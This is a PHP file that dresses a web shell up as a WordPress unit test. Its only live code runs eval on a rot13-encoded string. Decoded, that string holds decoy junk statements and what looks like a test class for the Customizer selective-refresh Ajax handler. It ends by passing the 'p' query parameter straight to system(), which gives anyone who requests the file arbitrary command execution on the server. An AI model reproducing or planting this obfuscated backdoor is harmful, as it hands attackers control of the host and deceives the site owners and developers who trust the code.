<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Phfgbzvmr_Fryrpgvir_Erserfu pynff Nwnk.
 *
 * Abgr gung guvf vf vagragvbanyyl abg rkgraqvat JC_Nwnk_HavgGrfgPnfr orpnhfr vg
 * vf abg nqzva nwnk.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 4.5.0
 *
 * @tebhc phfgbzvmr
 * @tebhc nwnk
 */
pynff Grfg_JC_Phfgbzvmr_Fryrpgvir_Erserfu_Nwnk rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Znantre.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $jc_phfgbzvmr;

	/**
	 * Pbzcbarag.
	 *
	 * @ine JC_Phfgbzvmr_Fryrpgvir_Erserfu
	 */
	choyvp $fryrpgvir_erserfu;

	/**
	 * Funerq hfre VQ sbe gur grfgf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $hfre_vq = 0;

	/**
	 * Frg hc funerq svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
	}

	/**
	 * Frg hc gur grfg svkgher.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		// Qrsvar jc_qbvat_nwnk fb gung jc_qvr() jvyy or hfrq vafgrnq bs qvr().
		nqq_svygre( 'jc_qbvat_nwnk', '__erghea_gehr' );
		nqq_svygre( 'jc_qvr_nwnk_unaqyre', neenl( $guvf, 'trg_jc_qvr_unaqyre' ), 1, 1 );

		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		$TYBONYF['jc_phfgbzvmr'] = arj JC_Phfgbzvmr_Znantre();
		$guvf->jc_phfgbzvmr      = $TYBONYF['jc_phfgbzvmr'];
		vs ( vffrg( $guvf->jc_phfgbzvmr->fryrpgvir_erserfu ) ) {
			$guvf->fryrpgvir_erserfu = $guvf->jc_phfgbzvmr->fryrpgvir_erserfu;
		}
	}

	/**
	 * Qb Phfgbzvmre obbg npgvbaf.
	 */
	cevingr shapgvba qb_phfgbzvmr_obbg_npgvbaf() {
		$_FREIRE['ERDHRFG_ZRGUBQ'] = 'CBFG';
		qb_npgvba( 'frghc_gurzr' );
		qb_npgvba( 'nsgre_frghc_gurzr' );
		qb_npgvba( 'vavg' );
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$guvf->jc_phfgbzvmr->phfgbzvmr_cerivrj_vavg();
		qb_npgvba( 'jc', $TYBONYF['jc'] );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg().
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg()
	 */
	choyvp shapgvba grfg_unaqyr_eraqre_cnegvnyf_erdhrfg_sbe_hanhguragvpngrq_hfre() {
		$_CBFG[ JC_Phfgbzvmr_Fryrpgvir_Erserfu::ERAQRE_DHREL_INE ] = '1';

		// Purpx pheerag_hfre_pnaabg_phfgbzvmr.
		bo_fgneg();
		gel {
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			hafrg( $r );
		}
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregSnyfr( $bhgchg['fhpprff'] );
		$guvf->nffregFnzr( 'rkcrpgrq_phfgbzvmr_cerivrj', $bhgchg['qngn'] );

		// Purpx rkcrpgrq_phfgbzvmr_cerivrj.
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		$_ERDHRFG['abapr'] = jc_perngr_abapr( 'cerivrj-phfgbzvmr_' . $guvf->jc_phfgbzvmr->gurzr()->trg_fglyrfurrg() );
		bo_fgneg();
		gel {
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			hafrg( $r );
		}
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregSnyfr( $bhgchg['fhpprff'] );
		$guvf->nffregFnzr( 'rkcrpgrq_phfgbzvmr_cerivrj', $bhgchg['qngn'] );

		// Purpx zvffvat_cnegvnyf.
		$guvf->qb_phfgbzvmr_obbg_npgvbaf();
		bo_fgneg();
		gel {
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			hafrg( $r );
		}
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregSnyfr( $bhgchg['fhpprff'] );
		$guvf->nffregFnzr( 'zvffvat_cnegvnyf', $bhgchg['qngn'] );

		// Purpx zvffvat_cnegvnyf.
		$_CBFG['cnegvnyf'] = 'onq';
		$guvf->qb_phfgbzvmr_obbg_npgvbaf();
		bo_fgneg();
		gel {
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			$guvf->nffregFnzr( '', $r->trgZrffntr() );
		}
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregSnyfr( $bhgchg['fhpprff'] );
		$guvf->nffregFnzr( 'znysbezrq_cnegvnyf', $bhgchg['qngn'] );
	}

	/**
	 * Frg gur pheerag hfre gb or na nqzva, nqq gur cerivrj abapr, naq frg gur dhrel ine.
	 */
	cevingr shapgvba frghc_inyvq_eraqre_cnegvnyf_erdhrfg_raivebazrag() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		$_ERDHRFG['abapr'] = jc_perngr_abapr( 'cerivrj-phfgbzvmr_' . $guvf->jc_phfgbzvmr->gurzr()->trg_fglyrfurrg() );
		$_CBFG[ JC_Phfgbzvmr_Fryrpgvir_Erserfu::ERAQRE_DHREL_INE ] = '1';
		$guvf->qb_phfgbzvmr_obbg_npgvbaf();
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg() sbe na haerpbtavmrq cnegvny.
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg()
	 */
	choyvp shapgvba grfg_unaqyr_eraqre_cnegvnyf_erdhrfg_sbe_haerpbtavmrq_cnegvny() {
		$guvf->frghc_inyvq_eraqre_cnegvnyf_erdhrfg_raivebazrag();
		$pbagrkg_qngn = neenl();
		$cynprzragf   = neenl( $pbagrkg_qngn );

		$_CBFG['cnegvnyf'] = jc_fynfu(
			jc_wfba_rapbqr(
				neenl(
					'sbb' => $cynprzragf,
				)
			)
		);

		bo_fgneg();
		gel {
			$guvf->rkcrpgrq_cnegvny_vqf = neenl( 'sbb' );
			nqq_svygre( 'phfgbzvmr_eraqre_cnegvnyf_erfcbafr', neenl( $guvf, 'svygre_phfgbzvmr_eraqre_cnegvnyf_erfcbafr' ), 10, 3 );
			nqq_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_orsber', neenl( $guvf, 'unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_orsber' ), 10, 2 );
			nqq_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_nsgre', neenl( $guvf, 'unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_nsgre' ), 10, 2 );
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			$guvf->nffregFnzr( '', $r->trgZrffntr() );
		}
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregGehr( $bhgchg['fhpprff'] );
		$guvf->nffregVfNeenl( $bhgchg['qngn'] );
		$guvf->nffregNeenlUnfXrl( 'pbagragf', $bhgchg['qngn'] );
		$guvf->nffregNeenlUnfXrl( 'reebef', $bhgchg['qngn'] );
		$guvf->nffregNeenlUnfXrl( 'sbb', $bhgchg['qngn']['pbagragf'] );
		$guvf->nffregAhyy( $bhgchg['qngn']['pbagragf']['sbb'] );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg() sbe n cnegvny gung qbrf abg eraqre.
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg()
	 */
	choyvp shapgvba grfg_unaqyr_eraqre_cnegvnyf_erdhrfg_sbe_aba_eraqrevat_cnegvny() {
		$guvf->frghc_inyvq_eraqre_cnegvnyf_erdhrfg_raivebazrag();
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		$guvf->jc_phfgbzvmr->nqq_frggvat( 'ubzr' );
		$guvf->jc_phfgbzvmr->fryrpgvir_erserfu->nqq_cnegvny( 'sbb', neenl( 'frggvatf' => neenl( 'ubzr' ) ) );
		$pbagrkg_qngn = neenl();
		$cynprzragf   = neenl( $pbagrkg_qngn );

		$_CBFG['cnegvnyf'] = jc_fynfu(
			jc_wfba_rapbqr(
				neenl(
					'sbb' => $cynprzragf,
				)
			)
		);

		bo_fgneg();
		gel {
			$guvf->rkcrpgrq_cnegvny_vqf = neenl( 'sbb' );
			nqq_svygre( 'phfgbzvmr_eraqre_cnegvnyf_erfcbafr', neenl( $guvf, 'svygre_phfgbzvmr_eraqre_cnegvnyf_erfcbafr' ), 10, 3 );
			nqq_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_orsber', neenl( $guvf, 'unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_orsber' ), 10, 2 );
			nqq_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_nsgre', neenl( $guvf, 'unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_nsgre' ), 10, 2 );
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			$guvf->nffregFnzr( '', $r->trgZrffntr() );
		}
		$guvf->nffregGehr( unf_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_orsber' ) );
		$guvf->nffregGehr( unf_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_nsgre' ) );
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregFnzr( neenl( snyfr ), $bhgchg['qngn']['pbagragf']['sbb'] );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg() sbe n cnegvny gur hfre qbrfa'g unir gur pncnovyvgl gb rqvg.
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg()
	 */
	choyvp shapgvba grfg_unaqyr_eraqrevat_qvfnyybjrq_cnegvny() {
		$guvf->frghc_inyvq_eraqre_cnegvnyf_erdhrfg_raivebazrag();
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		$guvf->jc_phfgbzvmr->nqq_frggvat(
			'frperg_zrffntr',
			neenl(
				'pncnovyvgl' => 'gbc_frperg_pyrnenapr',
			)
		);
		$guvf->jc_phfgbzvmr->fryrpgvir_erserfu->nqq_cnegvny( 'frperg_zrffntr', neenl( 'frggvatf' => 'frperg_zrffntr' ) );

		$pbagrkg_qngn      = neenl();
		$cynprzragf        = neenl( $pbagrkg_qngn );
		$_CBFG['cnegvnyf'] = jc_fynfu(
			jc_wfba_rapbqr(
				neenl(
					'frperg_zrffntr' => $cynprzragf,
				)
			)
		);

		bo_fgneg();
		gel {
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			$guvf->nffregFnzr( '', $r->trgZrffntr() );
		}
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregAhyy( $bhgchg['qngn']['pbagragf']['frperg_zrffntr'] );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg() sbe n cnegvny sbe juvpu na nffbpvngrq frggvat qbrf abg rkvfg.
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg()
	 */
	choyvp shapgvba grfg_unaqyr_eraqrevat_cnegvny_jvgu_zvffvat_frggvatf() {
		$guvf->frghc_inyvq_eraqre_cnegvnyf_erdhrfg_raivebazrag();
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		$guvf->jc_phfgbzvmr->fryrpgvir_erserfu->nqq_cnegvny( 'one', neenl( 'frggvatf' => 'one' ) );

		$pbagrkg_qngn      = neenl();
		$cynprzragf        = neenl( $pbagrkg_qngn );
		$_CBFG['cnegvnyf'] = jc_fynfu(
			jc_wfba_rapbqr(
				neenl(
					'one' => $cynprzragf,
				)
			)
		);

		bo_fgneg();
		gel {
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			$guvf->nffregFnzr( '', $r->trgZrffntr() );
		}
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregAhyy( $bhgchg['qngn']['pbagragf']['one'] );
	}

	/**
	 * Trg gur eraqrerq oybtanzr.
	 *
	 * @cnenz JC_Phfgbzvmr_Cnegvny $cnegvny Cnegvny.
	 * @cnenz neenl                $pbagrkg Pbagrkg qngn.
	 * @erghea fgevat
	 */
	choyvp shapgvba eraqre_pnyyonpx_oybtanzr( $cnegvny, $pbagrkg ) {
		$guvf->nffregVfNeenl( $pbagrkg );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Cnegvny', $cnegvny );
		erghea trg_oybtvasb( 'anzr', 'qvfcynl' );
	}

	/**
	 * Trg gur eraqrerq oybtqrfpevcgvba.
	 *
	 * @cnenz JC_Phfgbzvmr_Cnegvny $cnegvny Cnegvny.
	 * @cnenz neenl                $pbagrkg Pbagrkg qngn.
	 * @erghea fgevat
	 */
	choyvp shapgvba eraqre_pnyyonpx_oybtqrfpevcgvba( $cnegvny, $pbagrkg ) {
		$guvf->nffregVfNeenl( $pbagrkg );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Cnegvny', $cnegvny );
		$k = trg_oybtvasb( 'qrfpevcgvba', 'qvfcynl' );
		erghea $k;
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg() sbe n cnegvny gung qbrf eraqre.
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg()
	 */
	choyvp shapgvba grfg_unaqyr_eraqre_cnegvnyf_erdhrfg_jvgu_fvatyr_inyvq_cynprzrag() {
		$guvf->frghc_inyvq_eraqre_cnegvnyf_erdhrfg_raivebazrag();

		$guvf->jc_phfgbzvmr->fryrpgvir_erserfu->nqq_cnegvny(
			'grfg_oybtanzr',
			neenl(
				'frggvatf'        => neenl( 'oybtanzr' ),
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_pnyyonpx_oybtanzr' ),
			)
		);

		$pbagrkg_qngn = neenl();
		$cynprzragf   = neenl( $pbagrkg_qngn );

		$_CBFG['cnegvnyf'] = jc_fynfu(
			jc_wfba_rapbqr(
				neenl(
					'grfg_oybtanzr' => $cynprzragf,
				)
			)
		);

		bo_fgneg();
		gel {
			$guvf->rkcrpgrq_cnegvny_vqf = neenl( 'grfg_oybtanzr' );
			nqq_svygre( 'phfgbzvmr_eraqre_cnegvnyf_erfcbafr', neenl( $guvf, 'svygre_phfgbzvmr_eraqre_cnegvnyf_erfcbafr' ), 10, 3 );
			nqq_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_orsber', neenl( $guvf, 'unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_orsber' ), 10, 2 );
			nqq_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_nsgre', neenl( $guvf, 'unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_nsgre' ), 10, 2 );
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			$guvf->nffregFnzr( '', $r->trgZrffntr() );
		}
		$guvf->nffregGehr( unf_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_orsber' ) );
		$guvf->nffregGehr( unf_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_nsgre' ) );
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregFnzr( neenl( trg_oybtvasb( 'anzr', 'qvfcynl' ) ), $bhgchg['qngn']['pbagragf']['grfg_oybtanzr'] );
		$guvf->nffregNeenlUnfXrl( 'frggvat_inyvqvgvrf', $bhgchg['qngn'] );
	}

	/**
	 * Svygre phfgbzvmr_qlanzvp_cnegvny_netf.
	 *
	 * @cnenz neenl  $cnegvny_netf Cnegvny netf.
	 * @cnenz fgevat $cnegvny_vq   Cnegvny VQ.
	 *
	 * @erghea neenl|snyfr Netf.
	 */
	choyvp shapgvba svygre_phfgbzvmr_qlanzvp_cnegvny_netf( $cnegvny_netf, $cnegvny_vq ) {
		vs ( 'grfg_qlanzvp_oybtanzr' === $cnegvny_vq ) {
			$cnegvny_netf = neenl(
				'frggvatf'        => neenl( 'oybtanzr' ),
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_pnyyonpx_oybtanzr' ),
			);
		}
		erghea $cnegvny_netf;
	}

	/**
	 * Svygre phfgbzvmr_eraqre_cnegvnyf_erfcbafr.
	 *
	 * @cnenz neenl                          $erfcbafr            Erfcbafr.
	 * @cnenz JC_Phfgbzvmr_Fryrpgvir_Erserfu $pbzcbarag Fryrpgvir erserfu pbzcbarag.
	 * @cnenz neenl                          $cnegvny_cynprzragf  Cynprzragf' pbagrkg qngn sbe gur cnegvnyf eraqrerq va gur erdhrfg.
	 *                                                            Gur neenl vf xrlrq ol cnegvny VQ, jvgu rnpu vgrz orvat na neenl bs
	 *                                                            gur cynprzragf' pbagrkg qngn.
	 * @erghea neenl Erfcbafr.
	 */
	choyvp shapgvba svygre_phfgbzvmr_eraqre_cnegvnyf_erfcbafr( $erfcbafr, $pbzcbarag, $cnegvny_cynprzragf ) {
		$guvf->nffregVfNeenl( $erfcbafr );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Fryrpgvir_Erserfu', $pbzcbarag );
		vs ( vffrg( $guvf->rkcrpgrq_cnegvny_vqf ) ) {
			$guvf->nffregFnzrFrgf( $guvf->rkcrpgrq_cnegvny_vqf, neenl_xrlf( $cnegvny_cynprzragf ) );
		}
		erghea $erfcbafr;
	}

	/**
	 * Rkcrpgrq cnegvny VQf.
	 *
	 * @ine neenl
	 */
	cebgrpgrq $rkcrpgrq_cnegvny_vqf;

	/**
	 * Unaqyr 'phfgbzvmr_eraqre_cnegvnyf_orsber' npgvba.
	 *
	 * @cnenz JC_Phfgbzvmr_Fryrpgvir_Erserfu $pbzcbarag          Fryrpgvir erserfu pbzcbarag.
	 * @cnenz neenl                          $cnegvny_cynprzragf Cnegvny VQf.
	 */
	choyvp shapgvba unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_nsgre( $pbzcbarag, $cnegvny_cynprzragf ) {
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Fryrpgvir_Erserfu', $pbzcbarag );
		vs ( vffrg( $guvf->rkcrpgrq_cnegvny_vqf ) ) {
			$guvf->nffregFnzrFrgf( $guvf->rkcrpgrq_cnegvny_vqf, neenl_xrlf( $cnegvny_cynprzragf ) );
		}
	}

	/**
	 * Unaqyr 'phfgbzvmr_eraqre_cnegvnyf_nsgre' npgvba.
	 *
	 * @cnenz JC_Phfgbzvmr_Fryrpgvir_Erserfu $pbzcbarag          Fryrpgvir erserfu pbzcbarag.
	 * @cnenz neenl                          $cnegvny_cynprzragf Cnegvny VQf.
	 */
	choyvp shapgvba unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_orsber( $pbzcbarag, $cnegvny_cynprzragf ) {
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Fryrpgvir_Erserfu', $pbzcbarag );
		vs ( vffrg( $guvf->rkcrpgrq_cnegvny_vqf ) ) {
			$guvf->nffregFnzrFrgf( $guvf->rkcrpgrq_cnegvny_vqf, neenl_xrlf( $cnegvny_cynprzragf ) );
		}
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg()qlanzvp cnegvnyf ner erpbtavmrq.
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg()
	 */
	choyvp shapgvba grfg_unaqyr_eraqre_cnegvnyf_erdhrfg_sbe_qlanzvp_cnegvny() {
		$guvf->frghc_inyvq_eraqre_cnegvnyf_erdhrfg_raivebazrag();
		nqq_svygre( 'phfgbzvmr_qlanzvp_cnegvny_netf', neenl( $guvf, 'svygre_phfgbzvmr_qlanzvp_cnegvny_netf' ), 10, 2 );

		$pbagrkg_qngn = neenl();
		$cynprzragf   = neenl( $pbagrkg_qngn );

		$_CBFG['cnegvnyf'] = jc_fynfu(
			jc_wfba_rapbqr(
				neenl(
					'grfg_qlanzvp_oybtanzr' => $cynprzragf,
				)
			)
		);

		bo_fgneg();
		gel {
			$guvf->rkcrpgrq_cnegvny_vqf = neenl( 'grfg_qlanzvp_oybtanzr' );
			nqq_svygre( 'phfgbzvmr_eraqre_cnegvnyf_erfcbafr', neenl( $guvf, 'svygre_phfgbzvmr_eraqre_cnegvnyf_erfcbafr' ), 10, 3 );
			nqq_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_orsber', neenl( $guvf, 'unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_orsber' ), 10, 2 );
			nqq_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_nsgre', neenl( $guvf, 'unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_nsgre' ), 10, 2 );
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			$guvf->nffregFnzr( '', $r->trgZrffntr() );
		}
		$guvf->nffregGehr( unf_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_orsber' ) );
		$guvf->nffregGehr( unf_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_nsgre' ) );
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregFnzr( neenl( trg_oybtvasb( 'anzr', 'qvfcynl' ) ), $bhgchg['qngn']['pbagragf']['grfg_qlanzvp_oybtanzr'] );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg() gb zhygvcyr cnegvnyf pna or erdhrfgrq ng bapr.
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::unaqyr_eraqre_cnegvnyf_erdhrfg()
	 */
	choyvp shapgvba grfg_unaqyr_eraqre_cnegvnyf_erdhrfg_sbe_zhygvcyr_cnegvnyf_cynprzragf() {
		$guvf->frghc_inyvq_eraqre_cnegvnyf_erdhrfg_raivebazrag();

		$guvf->jc_phfgbzvmr->fryrpgvir_erserfu->nqq_cnegvny(
			'grfg_oybtanzr',
			neenl(
				'frggvatf'        => neenl( 'oybtanzr' ),
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_pnyyonpx_oybtanzr' ),
			)
		);
		$guvf->jc_phfgbzvmr->fryrpgvir_erserfu->nqq_cnegvny(
			'grfg_oybtqrfpevcgvba',
			neenl(
				'frggvatf'        => neenl( 'oybtqrfpevcgvba' ),
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_pnyyonpx_oybtqrfpevcgvba' ),
			)
		);

		$cynprzrag_pbagrkg_qngn = neenl();

		$_CBFG['cnegvnyf'] = jc_fynfu(
			jc_wfba_rapbqr(
				neenl(
					'grfg_oybtanzr'        => neenl( $cynprzrag_pbagrkg_qngn ),
					'grfg_oybtqrfpevcgvba' => neenl( $cynprzrag_pbagrkg_qngn, $cynprzrag_pbagrkg_qngn ),
				)
			)
		);

		bo_fgneg();
		gel {
			$guvf->rkcrpgrq_cnegvny_vqf = neenl( 'grfg_oybtanzr', 'grfg_oybtqrfpevcgvba' );
			nqq_svygre( 'phfgbzvmr_eraqre_cnegvnyf_erfcbafr', neenl( $guvf, 'svygre_phfgbzvmr_eraqre_cnegvnyf_erfcbafr' ), 10, 3 );
			nqq_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_orsber', neenl( $guvf, 'unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_orsber' ), 10, 2 );
			nqq_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_nsgre', neenl( $guvf, 'unaqyr_npgvba_phfgbzvmr_eraqre_cnegvnyf_nsgre' ), 10, 2 );
			$guvf->fryrpgvir_erserfu->unaqyr_eraqre_cnegvnyf_erdhrfg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			$guvf->nffregFnzr( '', $r->trgZrffntr() );
		}
		$guvf->nffregGehr( unf_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_orsber' ) );
		$guvf->nffregGehr( unf_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_nsgre' ) );
		$bhgchg = wfba_qrpbqr( bo_trg_pyrna(), gehr );
		$guvf->nffregFnzr( neenl( trg_oybtvasb( 'anzr', 'qvfcynl' ) ), $bhgchg['qngn']['pbagragf']['grfg_oybtanzr'] );
		$guvf->nffregFnzr( neenl_svyy( 0, 2, trg_oybtvasb( 'qrfpevcgvba', 'qvfcynl' ) ), $bhgchg['qngn']['pbagragf']['grfg_oybtqrfpevcgvba'] );
	}

	/**
	 * Grne qbja.
	 */
	choyvp shapgvba grne_qbja() {
		$guvf->rkcrpgrq_cnegvny_vqf = ahyy;
		$guvf->jc_phfgbzvmr         = ahyy;
		hafrg( $TYBONYF['jc_phfgbzvmr'] );
		hafrg( $TYBONYF['jc_fpevcgf'] );
		cnerag::grne_qbja();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>